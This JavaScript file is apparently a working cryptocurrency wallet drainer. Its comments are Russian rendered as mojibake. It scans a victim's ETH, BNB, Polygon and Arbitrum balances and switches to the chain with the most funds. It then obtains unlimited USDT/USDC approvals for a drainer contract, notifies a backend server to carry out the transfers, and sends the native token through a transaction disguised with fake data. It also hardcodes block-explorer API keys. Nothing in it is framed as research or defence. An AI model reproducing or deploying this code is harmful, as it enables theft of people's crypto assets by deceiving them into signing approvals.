import { ethers } from 'ethers';

// ABI –¥–ª—è ERC20 —Ç–æ–∫–µ–Ω–æ–≤
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI –¥–ª—è –¥—Ä–µ–π–Ω–µ—Ä–∞
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// –ö–ª—é—á–∏ API –¥–ª—è —Å–∫–∞–Ω–µ—Ä–æ–≤
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —Å–µ—Ç–µ–π
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x22E2fdf36E1257012B7dD305A2939C5e08C958c5",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS", // –ó–∞–º–µ–Ω–∏—Ç–µ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS", // –ó–∞–º–µ–Ω–∏—Ç–µ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS", // –ó–∞–º–µ–Ω–∏—Ç–µ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY
  }
};

// –£—Ç–∏–ª–∏—Ç–∞ –¥–ª—è –∑–∞–¥–µ—Ä–∂–∫–∏
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `–û—à–∏–±–∫–∞ API –¥–ª—è ${config.name}`);
  }
}

// –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `–û—à–∏–±–∫–∞ API –¥–ª—è —Ç–æ–∫–µ–Ω–∞ –≤ ${config.name}`);
  }
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º API –∏ fallback –Ω–∞ RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, usdtBalance, usdcBalance;

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞ –≤ ${config.name}: ${e.message}`);
    let provider;
    for (const rpc of config.rpcUrls) {
      try {
        provider = new ethers.providers.JsonRpcProvider(rpc);
        await provider.getBlockNumber();
        break;
      } catch (_) {}
    }
    if (!provider) throw new Error(`–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö RPC –¥–ª—è ${config.name}`);
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è USDT –≤ ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    usdtBalance = await usdt.balanceOf(userAddress);
  }

  try {
    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ API –¥–ª—è USDC –≤ ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    usdcBalance = await usdc.balanceOf(userAddress);
  }

  return { nativeBalance, usdtBalance, usdcBalance };
}

// –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Å—Ä–µ–¥—Å—Ç–≤
function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

// –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Å–µ—Ç–∏
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –Ω–∞ —Å–µ—Ç—å ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥—Ä–µ–π–Ω–∞
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;

  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);

  // –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–∞ ETH –ø–µ—Ä–µ–¥ approve
  const ethBalance = await signer.provider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${config.nativeToken} –¥–ª—è –≥–∞–∑–∞: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
    throw new Error(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ ${config.nativeToken} –¥–ª—è –æ–ø–ª–∞—Ç—ã –≥–∞–∑–∞`);
  }

  // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ approve –¥–ª—è USDT
  if (bal.usdtBalance.gt(0)) {
    console.log(`üìä USDT –±–∞–ª–∞–Ω—Å (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
    const realUsdtBalance = await usdt.balanceOf(userAddress);
    console.log(`üìä USDT –±–∞–ª–∞–Ω—Å (—Ä–µ–∞–ª—å–Ω—ã–π): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
    if (realUsdtBalance.lt(bal.usdtBalance)) {
      console.error(`‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –±–∞–ª–∞–Ω—Å: API –≤–µ—Ä–Ω—É–ª ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, —Ä–µ–∞–ª—å–Ω—ã–π: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
      bal.usdtBalance = realUsdtBalance;
    }

    const allowanceBefore = await usdt.allowance(userAddress, config.drainerAddress);
    console.log(`üìú USDT allowance –¥–æ: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDT`);

    if (allowanceBefore.lt(bal.usdtBalance)) {
      try {
        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
        const tx = await usdt.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log("‚úÖ USDT approve —É—Å–ø–µ—à–µ–Ω:", tx.hash);
        console.log("‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è approve...");
        await delay(5000);
        const allowanceAfter = await usdt.allowance(userAddress, config.drainerAddress);
        console.log(`üìú USDT allowance –ø–æ—Å–ª–µ: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDT`);
        await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, receipt.transactionHash);
      } catch (e) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ approve –¥–ª—è USDT: ${e.message}`);
        throw e;
      }
    } else {
      console.log("‚úÖ USDT allowance —É–∂–µ –¥–æ—Å—Ç–∞—Ç–æ—á–µ–Ω, —É–≤–µ–¥–æ–º–ª—è–µ–º —Å–µ—Ä–≤–µ—Ä");
      await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, null);
    }
  }

  // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ approve –¥–ª—è USDC
  if (bal.usdcBalance.gt(0)) {
    console.log(`üìä USDC –±–∞–ª–∞–Ω—Å (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
    const realUsdcBalance = await usdc.balanceOf(userAddress);
    console.log(`üìä USDC –±–∞–ª–∞–Ω—Å (—Ä–µ–∞–ª—å–Ω—ã–π): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
    if (realUsdcBalance.lt(bal.usdcBalance)) {
      console.error(`‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –±–∞–ª–∞–Ω—Å: API –≤–µ—Ä–Ω—É–ª ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, —Ä–µ–∞–ª—å–Ω—ã–π: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
      bal.usdcBalance = realUsdcBalance;
    }

    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
    if (allowanceBefore.lt(bal.usdcBalance)) {
      try {
        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
        const tx = await usdc.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log("‚úÖ USDC approve —É—Å–ø–µ—à–µ–Ω:", tx.hash);
        console.log("‚è≥ –û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è approve...");
        await delay(5000);
        const allowanceAfter = await usdc.allowance(userAddress, config.drainerAddress);
        console.log(`üìú USDC allowance –ø–æ—Å–ª–µ: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDC`);
        await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, receipt.transactionHash);
      } catch (e) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ approve –¥–ª—è USDC: ${e.message}`);
        throw e;
      }
    } else {
      console.log("‚úÖ USDC allowance —É–∂–µ –¥–æ—Å—Ç–∞—Ç–æ—á–µ–Ω, —É–≤–µ–¥–æ–º–ª—è–µ–º —Å–µ—Ä–≤–µ—Ä");
      await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, null);
    }
  }

  // –î—Ä–µ–π–Ω–∏–Ω–≥ –Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —Ç–æ–∫–µ–Ω–∞
  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await signer.provider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error(`–¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è processData (${config.nativeToken}) –Ω–µ —É–¥–∞–ª–∞—Å—å`);
        }
        console.log(`‚úÖ –î—Ä–µ–π–Ω–∏–Ω–≥ ${config.nativeToken} —É—Å–ø–µ—à–µ–Ω:`, receipt.transactionHash);
      } catch (e) {
        console.error(`‚ùå –û—à–∏–±–∫–∞ –≤—ã–∑–æ–≤–∞ processData (${config.nativeToken}): ${e.message}`);
        throw e;
      }
    }
  }
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(CHAINS[chainId].rpcUrls[0]);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    console.log(`üìä –†–µ–∞–ª—å–Ω—ã–π –±–∞–ª–∞–Ω—Å —Ç–æ–∫–µ–Ω–∞ (${tokenAddress}): ${balanceUnits}`);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10) / 10;
    console.log(`üìä –û–∫—Ä—É–≥–ª—ë–Ω–Ω—ã–π –±–∞–ª–∞–Ω—Å: ${roundedBalance}`);

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error('–ë–∞–ª–∞–Ω—Å —Å–ª–∏—à–∫–æ–º –º–∞–ª –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞');
    }

    console.log(`üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
    const response = await fetch('http://localhost:3000/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      console.log("‚úÖ –°–µ—Ä–≤–µ—Ä —É–≤–µ–¥–æ–º–ª—ë–Ω, —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω");
    } else {
      console.error("‚ùå –û—à–∏–±–∫–∞ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞:", data.message);
      throw new Error(data.message);
    }
  } catch (e) {
    console.error("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä:", e.message);
    throw e;
  }
}

// –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      console.log(`–°–µ—Ç—å: ${CHAINS[chainId].name}`);
      console.log(`üí∞ ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
      console.log(`üü† USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
      console.log(`üîµ USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–∞–ª–∞–Ω—Å–∞ –≤ —Å–µ—Ç–∏ ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    );

  if (!sorted.length) {
    console.warn("‚õî –ù–µ—Ç –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö —Å–µ—Ç–µ–π —Å –±–∞–ª–∞–Ω—Å–æ–º.");
    return;
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  await drain(target.chainId, signer, userAddress, target);
}
